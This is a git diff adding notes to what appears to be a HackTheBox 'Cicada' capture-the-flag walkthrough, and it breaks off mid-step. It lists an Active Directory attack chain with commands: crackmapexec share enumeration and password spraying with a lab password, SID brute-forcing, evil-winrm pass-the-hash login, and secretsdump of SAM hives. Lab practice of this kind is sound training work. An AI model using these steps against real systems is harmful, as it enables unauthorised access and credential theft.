@@ -515,3 +515,28 @@ impacket-secretsdump -sam sam -system system local
 ```
 evil-winrm -u <username> -H <hash> -i cicada.htb
 ```
+
+
+
+
+
+## P﻿otential Hacking Scenario:
+
+##### \
+1﻿. Recon, use nmap to get the domain name for the IP
+
+##### 2﻿. store the domain name locally on /etc/hosts, use the domain name from now on
+
+3﻿. Use crackmapexec smb <domain name> --shares, to get anonymous shares., if that does not work, use -u 'guest' and -p ''
+
+4. Brute force SIDs, to look for Domain Users
+
+5﻿. Use crackmapexec to try the found creds on all possible users found above. 
+
+6﻿. Enumerate more Domain Users using ,|crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --
+users\
+7﻿. use evil winrm to log into the machine with the found user.
+
+8﻿. Find out privielges
+
+9﻿.  Exfil Registry hives, sam and
